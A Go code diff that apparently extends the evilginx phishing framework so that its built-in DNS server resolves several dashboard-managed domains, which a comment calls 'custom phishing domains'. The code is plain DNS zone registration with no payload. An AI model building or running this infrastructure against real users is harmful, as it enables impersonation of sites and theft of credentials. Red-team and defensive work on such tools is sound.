@@ -14,19 +14,21 @@ import (
 )
 
 type Nameserver struct {
-	srv    *dns.Server
-	cfg    *Config
-	bind   string
-	serial uint32
-	ctx    context.Context
+	serial       uint32
+	bind         string
+	srv          *dns.Server
+	cfg          *Config
+	ctx          context.Context
+	servedZones  map[string]bool // DNS zones with a handler registered (miekg panics on duplicates)
 }
 
 func NewNameserver(cfg *Config) (*Nameserver, error) {
 	o := &Nameserver{
-		serial: uint32(time.Now().Unix()),
-		cfg:    cfg,
-		bind:   fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
-		ctx:    context.Background(),
+		serial:      uint32(time.Now().Unix()),
+		cfg:         cfg,
+		bind:        fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
+		ctx:         context.Background(),
+		servedZones: make(map[string]bool),
 	}
 
 	o.Reset()
@@ -35,7 +37,28 @@ func NewNameserver(cfg *Config) (*Nameserver, error) {
 }
 
 func (o *Nameserver) Reset() {
-	dns.HandleFunc(pdom(o.cfg.general.Domain), o.handleRequest)
+	// Serve the server's base domain plus every dashboard-managed domain so
+	// custom phishing domains resolve through evilginx's authoritative DNS.
+	o.registerZone(o.cfg.general.Domain)
+	for _, d := range o.cfg.GetDomainSettings().Domains {
+		o.registerZone(d)
+	}
+}
+
+// registerZone registers a DNS handler for a domain zone exactly once.
+// (dns.HandleFunc panics if the same pattern is registered twice.)
+func (o *Nameserver) registerZone(domain string) {
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	if domain == "" || o.servedZones[domain] {
+		return
+	}
+	dns.HandleFunc(pdom(domain), o.handleRequest)
+	o.servedZones[domain] = true
+}
+
+// RegisterDomain adds a new DNS zone at runtime (dashboard "Add domain").
+func (o *Nameserver) RegisterDomain(domain string) {
+	o.registerZone(domain)
 }
 
 func (o *Nameserver) Start() {
